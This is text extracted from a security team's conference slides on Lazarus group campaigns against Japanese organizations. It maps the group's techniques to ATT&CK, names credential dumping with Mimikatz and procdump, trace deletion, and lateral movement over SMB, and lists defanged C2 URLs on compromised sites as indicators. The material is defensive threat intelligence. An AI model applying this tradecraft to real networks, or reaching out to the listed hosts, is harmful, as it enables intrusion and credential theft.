Cloud Service Discovery 
(T1526)
File and Directory 
Permissions Modification 
(T1222)
Cloud Service Dashboard 
(T1538)
Execution Guardrails 
(T1480)
Cloud Infrastructure 
Discovery (T1580)
Operation JTrack ATT&CK Mapping
Reconnaissance
Resource 
Development
Initial Access
Execution
Persistence
Privilege Escalation
Defense Evasion
Credential Access
Discovery
Lateral Movement
Collection
Command & Control
Exfiltration
Gather Victim Identity 
Information (T1589)
Acquire Infrastructure 
(T1583)
Valid Accounts (T1078)
Windows Management 
Instrumentation (T1047) Path Interception (T1034) Path Interception (T1034)
Direct Volume Access 
(T1006)
Group Policy Modification 
(T1484)
OS Credential Dumping 
(T1003)
System Service Discovery 
(T1007)
Remote Services (T1021) Data from Local System 
(T1005)
Data Obfuscation (T1001)
Exfiltration Over Other 
Network Medium (T1011)
Gather Victim Network 
Information (T1590)
Compromise 
Infrastructure (T1584)
Replication Through 
Removable Media 
(T1091)
Scheduled Task/Job 
(T1053)
Boot or Logon Initialization 
Scripts (T1037)
Boot or Logon 
Initialization Scripts 
(T1037)
Rootkit (T1014)
Virtualization/Sandbox 
Evasion (T1497)
Network Sniffing (T1040)
Application Window 
Discovery (T1010)
Shared Webroot (T1051)
Data from Removable 
Media (T1025)
Fallback Channels 
(T1008)
Automated Exfiltration 
(T1020)
Gather Victim Org 
Information (T1591)
Establish Accounts 
(T1585)
External Remote Services 
(T1133)
Command and Scripting 
Interpreter (T1059)
Scheduled Task/Job 
(T1053)
Scheduled Task/Job 
(T1053)
Obfuscated Files or 
Information (T1027)
Unused/Unsupported 
Cloud Regions (T1535)
Input Capture (T1056)
Query Registry (T1012)
Software Deployment 
Tools (T1072)
Data from Network 
Shared Drive (T1039)
Multiband Communication 
(T1026)
Scheduled Transfer 
(T1029)
Gather Victim Host 
Information (T1592)
Compromise Accounts 
(T1586)
Drive-by Compromise 
(T1189)
Graphical User Interface 
(T1061)
Hypervisor (T1062)
Process Injection (T1055) Masquerading (T1036)
Pre-OS Boot (T1542)
Brute Force (T1110)
System Network 
Configuration Discovery 
(T1016)
Taint Shared Content 
(T1080)
Input Capture (T1056)
Commonly Used Port 
(T1043)
Data Transfer Size Limits 
(T1030)
Search Open 
Websites/Domains 
(T1593)
Develop Capabilities 
(T1587)
Exploit Public-Facing 
Application (T1190)
Scripting (T1064)
Valid Accounts (T1078)
Exploitation for Privilege 
Escalation (T1068)
Process Injection (T1055) Abuse Elevation Control 
Mechanism (T1548)
Two-Factor 
Authentication 
Interception (T1111)
Remote System Discovery 
(T1018)
Replication Through 
Removable Media 
(T1091)
Data Staged (T1074)
Application Layer Protocol 
(T1071)
Exfiltration Over C2 
Channel (T1041)
Search Victim-Owned 
Websites (T1594)
Obtain Capabilities 
(T1588)
Supply Chain 
Compromise (T1195)
Software Deployment 
Tools (T1072)
Account Manipulation 
(T1098)
Valid Accounts (T1078)
Scripting (T1064)
Use Alternate 
Authentication Material 
(T1550)
Forced Authentication 
(T1187)
System Owner/User 
Discovery (T1033)
Component Object Model 
and Distributed COM 
(T1175)
Screen Capture (T1113)
Proxy (T1090)
Exfiltration Over 
Alternative Protocol 
(T1048)
Active Scanning (T1595)
Trusted Relationship 
(T1199)
Native API (T1106)
Redundant Access 
(T1108)
Access Token 
Manipulation (T1134)
Indicator Removal on Host 
(T1070)
Subvert Trust Controls 
(T1553)
Exploitation for 
Credential Access 
(T1212)
Network Sniffing (T1040)
Exploitation of Remote 
Services (T1210)
Email Collection (T1114)
Communication Through 
Removable Media 
(T1092)
Exfiltration Over Physical 
Medium (T1052)
Search Open Technical 
Databases (T1596)
Hardware Additions 
(T1200)
Shared Modules (T1129) External Remote Services 
(T1133)
Group Policy Modification 
(T1484)
Valid Accounts (T1078)
Modify Authentication 
Process (T1556)
Steal Application Access 
Token (T1528)
Network Service Scanning 
(T1046)
Internal Spearphishing 
(T1534)
Clipboard Data (T1115)
Non-Application Layer 
Protocol (T1095)
Transfer Data to Cloud 
Account (T1537)
Search Closed Sources 
(T1597)
Phishing (T1566)
Source (T1153)
Create Account (T1136) Create or Modify System 
Process (T1543)
Redundant Access 
(T1108)
Impair Defenses (T1562)
Steal Web Session 
Cookie (T1539)
System Network 
Connections Discovery 
(T1049)
Use Alternate 
Authentication Material 
(T1550)
Automated Collection 
(T1119)
Web Service (T1102)
Exfiltration Over Web 
Service (T1567)
Phishing for Information 
(T1598)
Component Object Model 
and Distributed COM 
(T1175)
Office Application Startup 
(T1137)
Event Triggered 
Execution (T1546)
Modify Registry (T1112)
Hide Artifacts (T1564)
Unsecured Credentials 
(T1552)
Process Discovery 
(T1057)
Remote Service Session 
Hijacking (T1563)
Audio Capture (T1123)
Multi-Stage Channels 
(T1104)
Exploitation for Client 
Execution (T1203)
Browser Extensions 
(T1176)
Boot or Logon Autostart 
Execution (T1547)
Trusted Developer Utilities 
Proxy Execution (T1127)
Hijack Execution Flow 
(T1574)
Credentials from 
Password Stores (T1555)
Permission Groups 
Discovery (T1069)
Lateral Tool Transfer 
(T1570)
Video Capture (T1125)
Ingress Tool Transfer 
(T1105)
User Execution (T1204)
BITS Jobs (T1197)
Abuse Elevation Control 
Mechanism (T1548)
Access Token 
Manipulation (T1134)
Modify Cloud Compute 
Infrastructure (T1578)
Modify Authentication 
Process (T1556)
System Information 
Discovery (T1082)
Man in the Browser 
(T1185)
Data Encoding (T1132)
Inter-Process 
Communication (T1559) Traffic Signaling (T1205)
Hijack Execution Flow 
(T1574)
Deobfuscate/Decode Files 
or Information (T1140)
Network Boundary 
Bridging (T1599)
Man-in-the-Middle 
(T1557)
File and Directory 
Discovery (T1083)
Data from Information 
Repositories (T1213)
Traffic Signaling (T1205)
System Services (T1569)
Server Software 
Component (T1505)
LC_MAIN Hijacking 
(T1149)
Weaken Encryption 
(T1600)
Steal or Forge Kerberos 
Tickets (T1558)
Account Discovery 
(T1087)
Data from Cloud Storage 
Object (T1530)
Remote Access Software 
(T1219)
Implant Container Image 
(T1525)
BITS Jobs (T1197)
Modify System Image 
(T1601)
Peripheral Device 
Discovery (T1120)
Man-in-the-Middle 
(T1557)
Dynamic Resolution 
(T1568)
Pre-OS Boot (T1542)
Indirect Command 
Execution (T1202)
System Time Discovery 
(T1124)
Archive Collected Data 
(T1560)
Non-Standard Port 
(T1571)
Create or Modify System 
Process (T1543)
Traffic Signaling (T1205)
Network Share Discovery 
(T1135)
Data from Configuration 
Repository (T1602)
Protocol Tunneling 
(T1572)
Event Triggered Execution 
(T1546)
Rogue Domain Controller 
(T1207)
Password Policy 
Discovery (T1201)
Encrypted Channel 
(T1573)
Boot or Logon Autostart 
Execution (T1547)
Exploitation for Defense 
Evasion (T1211)
Browser Bookmark 
Discovery (T1217)
Compromise Client 
Software Binary (T1554)
Signed Script Proxy 
Execution (T1216)
Domain Trust Discovery 
(T1482)
Hijack Execution Flow 
(T1574)
Signed Binary Proxy 
Execution (T1218)
Virtualization/Sandbox 
Evasion (T1497)
XSL Script Processing 
(T1220)
Software Discovery 
(T1518)
Template Injection 
(T1221)
Cloud Service Discovery 
(T1526)
File and Directory 
Permissions Modification 
(T1222)
Cloud Service Dashboard 
(T1538)
Execution Guardrails 
(T1480)
Cloud Infrastructure 
Discovery (T1580)
Comparison ATT&CK
Reconnaissance
Resource 
Development
Initial Access
Execution
Persistence
Privilege Escalation
Defense Evasion
Credential Access
Discovery
Lateral Movement
Collection
Command & Control
Exfiltration
Gather Victim Identity 
Information (T1589)
Acquire Infrastructure 
(T1583)
Valid Accounts (T1078)
Windows Management 
Instrumentation (T1047) Path Interception (T1034) Path Interception (T1034)
Direct Volume Access 
(T1006)
Group Policy Modification 
(T1484)
OS Credential Dumping 
(T1003)
System Service Discovery 
(T1007)
Remote Services (T1021) Data from Local System 
(T1005)
Data Obfuscation (T1001)
Exfiltration Over Other 
Network Medium (T1011)
Gather Victim Network 
Information (T1590)
Compromise 
Infrastructure (T1584)
Replication Through 
Removable Media 
(T1091)
Scheduled Task/Job 
(T1053)
Boot or Logon Initialization 
Scripts (T1037)
Boot or Logon 
Initialization Scripts 
(T1037)
Rootkit (T1014)
Virtualization/Sandbox 
Evasion (T1497)
Network Sniffing (T1040)
Application Window 
Discovery (T1010)
Shared Webroot (T1051)
Data from Removable 
Media (T1025)
Fallback Channels 
(T1008)
Automated Exfiltration 
(T1020)
Gather Victim Org 
Information (T1591)
Establish Accounts 
(T1585)
External Remote Services 
(T1133)
Command and Scripting 
Interpreter (T1059)
Scheduled Task/Job 
(T1053)
Scheduled Task/Job 
(T1053)
Obfuscated Files or 
Information (T1027)
Unused/Unsupported 
Cloud Regions (T1535)
Input Capture (T1056)
Query Registry (T1012)
Software Deployment 
Tools (T1072)
Data from Network 
Shared Drive (T1039)
Multiband Communication 
(T1026)
Scheduled Transfer 
(T1029)
Gather Victim Host 
Information (T1592)
Compromise Accounts 
(T1586)
Drive-by Compromise 
(T1189)
Graphical User Interface 
(T1061)
Hypervisor (T1062)
Process Injection (T1055) Masquerading (T1036)
Pre-OS Boot (T1542)
Brute Force (T1110)
System Network 
Configuration Discovery 
(T1016)
Taint Shared Content 
(T1080)
Input Capture (T1056)
Commonly Used Port 
(T1043)
Data Transfer Size Limits 
(T1030)
Search Open 
Websites/Domains 
(T1593)
Develop Capabilities 
(T1587)
Exploit Public-Facing 
Application (T1190)
Scripting (T1064)
Valid Accounts (T1078)
Exploitation for Privilege 
Escalation (T1068)
Process Injection (T1055) Abuse Elevation Control 
Mechanism (T1548)
Two-Factor 
Authentication 
Interception (T1111)
Remote System Discovery 
(T1018)
Replication Through 
Removable Media 
(T1091)
Data Staged (T1074)
Application Layer Protocol 
(T1071)
Exfiltration Over C2 
Channel (T1041)
Search Victim-Owned 
Websites (T1594)
Obtain Capabilities 
(T1588)
Supply Chain 
Compromise (T1195)
Software Deployment 
Tools (T1072)
Account Manipulation 
(T1098)
Valid Accounts (T1078)
Scripting (T1064)
Use Alternate 
Authentication Material 
(T1550)
Forced Authentication 
(T1187)
System Owner/User 
Discovery (T1033)
Component Object Model 
and Distributed COM 
(T1175)
Screen Capture (T1113)
Proxy (T1090)
Exfiltration Over 
Alternative Protocol 
(T1048)
Active Scanning (T1595)
Trusted Relationship 
(T1199)
Native API (T1106)
Redundant Access 
(T1108)
Access Token 
Manipulation (T1134)
Indicator Removal on Host 
(T1070)
Subvert Trust Controls 
(T1553)
Exploitation for 
Credential Access 
(T1212)
Network Sniffing (T1040)
Exploitation of Remote 
Services (T1210)
Email Collection (T1114)
Communication Through 
Removable Media 
(T1092)
Exfiltration Over Physical 
Medium (T1052)
Search Open Technical 
Databases (T1596)
Hardware Additions 
(T1200)
Shared Modules (T1129) External Remote Services 
(T1133)
Group Policy Modification 
(T1484)
Valid Accounts (T1078)
Modify Authentication 
Process (T1556)
Steal Application Access 
Token (T1528)
Network Service Scanning 
(T1046)
Internal Spearphishing 
(T1534)
Clipboard Data (T1115)
Non-Application Layer 
Protocol (T1095)
Transfer Data to Cloud 
Account (T1537)
Search Closed Sources 
(T1597)
Phishing (T1566)
Source (T1153)
Create Account (T1136) Create or Modify System 
Process (T1543)
Redundant Access 
(T1108)
Impair Defenses (T1562)
Steal Web Session 
Cookie (T1539)
System Network 
Connections Discovery 
(T1049)
Use Alternate 
Authentication Material 
(T1550)
Automated Collection 
(T1119)
Web Service (T1102)
Exfiltration Over Web 
Service (T1567)
Phishing for Information 
(T1598)
Component Object Model 
and Distributed COM 
(T1175)
Office Application Startup 
(T1137)
Event Triggered 
Execution (T1546)
Modify Registry (T1112)
Hide Artifacts (T1564)
Unsecured Credentials 
(T1552)
Process Discovery 
(T1057)
Remote Service Session 
Hijacking (T1563)
Audio Capture (T1123)
Multi-Stage Channels 
(T1104)
Exploitation for Client 
Execution (T1203)
Browser Extensions 
(T1176)
Boot or Logon Autostart
Execution (T1547)
Trusted Developer Utilities 
Proxy Execution (T1127)
Hijack Execution Flow 
(T1574)
Credentials from 
Password Stores (T1555)
Permission Groups 
Discovery (T1069)
Lateral Tool Transfer 
(T1570)
Video Capture (T1125)
Ingress Tool Transfer 
(T1105)
User Execution (T1204)
BITS Jobs (T1197)
Abuse Elevation Control 
Mechanism (T1548)
Access Token 
Manipulation (T1134)
Modify Cloud Compute 
Infrastructure (T1578)
Modify Authentication 
Process (T1556)
System Information 
Discovery (T1082)
Man in the Browser 
(T1185)
Data Encoding (T1132)
Inter-Process 
Communication (T1559) Traffic Signaling (T1205)
Hijack Execution Flow 
(T1574)
Deobfuscate/Decode Files 
or Information (T1140)
Network Boundary 
Bridging (T1599)
Man-in-the-Middle 
(T1557)
File and Directory 
Discovery (T1083)
Data from Information 
Repositories (T1213)
Traffic Signaling (T1205)
System Services (T1569)
Server Software 
Component (T1505)
LC_MAIN Hijacking 
(T1149)
Weaken Encryption 
(T1600)
Steal or Forge Kerberos 
Tickets (T1558)
Account Discovery 
(T1087)
Data from Cloud Storage 
Object (T1530)
Remote Access Software 
(T1219)
Implant Container Image 
(T1525)
BITS Jobs (T1197)
Modify System Image 
(T1601)
Peripheral Device 
Discovery (T1120)
Man-in-the-Middle 
(T1557)
Dynamic Resolution 
(T1568)
Pre-OS Boot (T1542)
Indirect Command 
Execution (T1202)
System Time Discovery 
(T1124)
Archive Collected Data 
(T1560)
Non-Standard Port 
(T1571)
Create or Modify System 
Process (T1543)
Traffic Signaling (T1205)
Network Share Discovery 
(T1135)
Data from Configuration 
Repository (T1602)
Protocol Tunneling 
(T1572)
Event Triggered Execution 
(T1546)
Rogue Domain Controller 
(T1207)
Password Policy 
Discovery (T1201)
Encrypted Channel 
(T1573)
Boot or Logon Autostart
Execution (T1547)
Exploitation for Defense 
Evasion (T1211)
Browser Bookmark 
Discovery (T1217)
Compromise Client 
Software Binary (T1554)
Signed Script Proxy 
Execution (T1216)
Domain Trust Discovery 
(T1482)
Hijack Execution Flow 
(T1574)
Signed Binary Proxy 
Execution (T1218)
Virtualization/Sandbox 
Evasion (T1497)
XSL Script Processing 
(T1220)
Software Discovery 
(T1518)
Template Injection 
(T1221)
Cloud Service Discovery 
(T1526)
File and Directory 
Permissions Modification 
(T1222)
Cloud Service Dashboard 
(T1538)
Execution Guardrails 
(T1480)
Cloud Infrastructure 
Discovery (T1580)
Commonly used TTP
Tactic
ID
Name
Description
Resource Development
T1584.004
Compromise Infrastructure: 
Server
Lazarus uses the compromised server as a C2 server.
T1587.001
Develop Capabilities: Malware
Lazarus uses its own malware.
Defense Evasion
T1027
Obfuscated Files or Information
Lazarus uses binary padding to add junk data.(T1027.001)
In addition, Lazarus uses packers such as VMProtect and Themida.
(T1027.002)
T1070
Indicator Removal on Host 
Lazarus deletes traces using timestomp, sdelete, del command, etc. 
Credential Access
T1003.001
OS Credential Dumping: LSASS 
Memory
Lazarus dumps credential from LSASS using Mimikatz, procdump, 
etc. 
Lateral Movement
T1021.002
Remote Services: SMB/Windows 
Admin Shares
Lazarus uses the stolen credentials to copy and execute files to other 
devices using wmic commands and SMB tools.
Collection
T1560.001
Archive Collected Data: Archive 
via Utility
Lazarus compresses collected data prior to exfiltration using WinRAR.
Measures for commonly used TTP
Technique
Detection and Mitigation
Defensive Tactics and 
Techniques (D3FEND)
Obfuscated Files or Information
M1049: Antivirus/Antimalware
- Detect
- File Analysis
- File Content Rules
- Dynamic Analysis
Indicator Removal on Host 
M1041: Encrypt Sensitive Information
M1029: Remote Data Storage
M1022: Restrict File and Directory Permissions
- Detect
- Process Analysis
- File Access Pattern Analysis
- User Behavior Analysis
- Resource Access Pattern Analysis
OS Credential Dumping: LSASS Memory
M1025: Privileged Process Integrity
M1026: Privileged Account Management
M1027: Password Policies
M1028: Operating System Configuration
M1043: Credential Access Protection
- Harden
- CredentialHardening
- Multi-factor Authentication
Remote Services: SMB/Windows Admin 
Shares
M1026: Privileged Account Management
M1027: Password Policies
M1037: Filter Network Traffic
- Detect
- Network Traffic Analysis
- Isolate
- Network Isolation
Archive Collected Data: Archive via Utility
M1047: Audit
- Detect
- File Analysis
- File Content Rules
- Process Analysis
- Process Spawn Analysis
Case of APT Attack Route - SNS -
SNS
VPN
Home
Uses private SNS account 
during at remote work
Attacker contacts a target and 
infects the host with malware 
Attacker infects the network when the 
target connects to a VPN
#1
#2
#3
#4
Lateral movement
#5
Case of APT Attack Route - Merger -
Infected Network
VPN
Already infected 
network
#1
Attacker infects the network 
during network integration. 
#2
#3
Lateral movement
#4
Many legitimate web servers in the 
target organization's country are used by 
attackers.
Attackers hacked cloud chat 
service used for business.
Features of C2 Server
The attacker infected legitimate web servers
to use them as C2.
How Legitimate Web Servers are Infected
Cloud chat
service
Uses chat between website 
developer and owners 
#0
Website
developer
Attacker hacks chat service 
and gets server 
authentication information
#1
VPN
service
Infects websites via VPN service
#2
PHP Backdoor
b374k shell 2.8
Analysis Tools
blindingcan_rc4_post_decode.py
blindingcan_aes_post_decode.py
Analysis Tools
blindingcan_rc4_post_decode.py
A tool to decode URL parameter for BLINDINGCAN_RC4.
blindingcan_aes_post_decode.py
A tool to decode POST data for BLINDINGCAN_AES.
How to Download
https://github.com/JPCERTCC/Lazarus-research
We described a new campaign by the Lazarus group 
targeting Japanese organizations. 
We provided insights in intelligence analysis and APT 
handling by providing TTPs of Lazarus group.
We also presented the new TTP seen in recent attacks and 
explained the need for countermeasures.
Takeaways
Thank you!
@jpcert_en
ir-info@jpcert.or.jp
PGP https://www.jpcert.or.jp/english/pgp/
Operation Dream Job
https[:]//gestao.simtelecomrs.com[.]br/sac/digital/client.jsp
https[:]//sac.onecenter.com[.]br/sac/masks/wfr_masks.jsp
https[:]//mk.bital.com[.]br/sac/Formule/Manager.jsp
https[:]//www.automercado.co[.]cr/empleo/css/main.jsp
https[:]//www.curiofirenze[.]com/include/inc-site.asp
https[:]//www.ne-ba[.]org/files/news/thumbs/thumbs.asp
https[:]//www.sanlorenzoyacht[.]com/newsl/include/inc-map.asp
https[:]//www.commodore.com[.]tr/mobiquo/appExtt/notdefteri/writenote.php
https[:]//www.fabianiarte[.]com/newsletter/arte/view.asp
https[:]//www.scimpex[.]com/admin/assets/backup/requisition/requisition.php
https[:]//akramportal[.]org/public/voice/voice.php
https[:]//inovecommerce.com[.]br/public/pdf/view.php
https[:]//www.index-consulting[.]jp:443/eng/news/index.php
http[:]//kenpa[.]org/yokohama/main.php
https[:]//vega.mh-tec[.]jp:443/.well-known/index.php
http[:]//www.hirokawaunso.co[.]jp/wordpress/wp-includes/ID3/module.audio.mp4.php
https[:]//ja-fc.or[.]jp/shop/shopping.php
https[:]//www.leemble[.]com/5mai-lyon/public/webconf.php
https[:]//www.tronslog[.]com/public/appstore.php
https[:]//mail.clicktocareers[.]com/dev_clicktocareers/public/mailview.php
IoC
Operation JTrack

http[:]//aquagoat[.]com/customer

http[:]//blacktiger[.]com/input

http[:]//bluedog[.]com/submit

http[:]//coraltiger[.]com/search

http[:]//goldtiger[.]com/find

http[:]//greentiger[.]com/submit

http[:]//industryarticleboard[.]com/evolution

http[:]//industryarticleboard[.]com/view

http[:]//maturicafe[.]com/main

http[:]//purplefrog[.]com/remove

http[:]//whitedragon[.]com/search

https[:]//coralcameleon[.]com/register

https[:]//industryarticleboard[.]com/article

https[:]//maturicafe[.]com/polo

https[:]//salmonrabbit[.]com/login

https[:]//whitecameleon[.]com/find

https[:]//whiterabbit[.]com/input

http[:]//toysbagonline[.]com/reviews

http[:]//purewatertokyo[.]com/list

http[:]//pinkgoat[.]com/input

http[:]//yellowlion[.]com/remove

http[:]//salmonrabbit[.]com/find

http[:]//bluecow[.]com/input

http[:]//www.karin-store[.]com/recaptcha.php

http[:]//www.karin-store[.]com/data/config/total_manager.php

http[:]//katawaku[.]jp/bbs/data/group/group-manager.php

http[:]//3.90.97[.]16/doc/total.php

http[:]//www.maturicafe[.]com/status

http[:]//www.industryarticleboard[.]com/view

http[:]//yoshinorihirano[.]net/wp-includes/feed-xml.php
IoC
Operation Dream Job

Search Open Websites/Domains (T1593)

Compromise Infrastructure (T1584)

Compromise Accounts (T1586)

Develop Capabilities (T1587)

Phishing (T1566)

Command and Scripting Interpreter (T1059)

User Execution (T1204)

System Services (T1569)

Create or Modify System Process (T1543)

Boot or Logon Autostart Execution (T1547)

Obfuscated Files or Information (T1027)

Masquerading (T1036)

Template Injection (T1221)

OS Credential Dumping (T1003)

Network Sniffing (T1040)

Unsecured Credentials (T1552)
ATT&CK

Credentials from Password Stores (T1555)

System Network Configuration Discovery 
(T1016)

Remote System Discovery (T1018)

Network Sniffing (T1040)

Account Discovery (T1087)

Network Share Discovery (T1135)

Remote Services (T1021)

Lateral Tool Transfer (T1570)

Archive Collected Data (T1560)

Application Layer Protocol (T1071)

Proxy (T1090)

Data Encoding (T1132)

Remote Access Software (T1219)

Encrypted Channel (T1573)

Exfiltration Over C2 Channel (T1041)
Operation JTrack
Compromise Infrastructure (T1584)
Develop Capabilities (T1587)
Trusted Relationship (T1199)
Exploitation for Privilege Escalation 
(T1068)
Obfuscated Files or Information 
(T1027)
Masquerading (T1036)
Indicator Removal on Host (T1070)
OS Credential Dumping (T1003)
Network Share Discovery (T1135)
Remote Services (T1021)
Lateral Tool Transfer (T1570)
Archive Collected Data (T1560)
ATT&CK
Application Layer Protocol (T1071)
Proxy (T1090)
Ingress Tool Transfer (T1105) 
Data Encoding (T1132)
Protocol Tunneling (T1572)
Exfiltration Over C2 Channel (T1041)
[1] VB2020 local: To catch a Banshee: how Kimsuky’s tradecraft betrays its complementary campaigns 
and mission 
https://vb2020.vblocalhost.com/conference/presentations/to-catch-a-banshee-how-kimsukys-tradecraft-
betrays-its-complementary-campaigns-and-mission/
[2] SECURELIST: Hello! My name is Dtrack
https://securelist.com/my-name-is-dtrack/93338/
[3] SEQRITE: Seqrite Annual Threat Report 2020
https://www.seqrite.com/documents/en/threat-reports/Seqrite-Annual-Threat-Report-2020.pdf
[4] Microsoft: PowerTip: Use PowerShell to Get a List of Computers and IP Addresses from Active 
Directory
https://devblogs.microsoft.com/scripting/powertip-use-powershell-to-get-a-list-of-computers-and-ip-
addresses-from-active-directory/
Reference
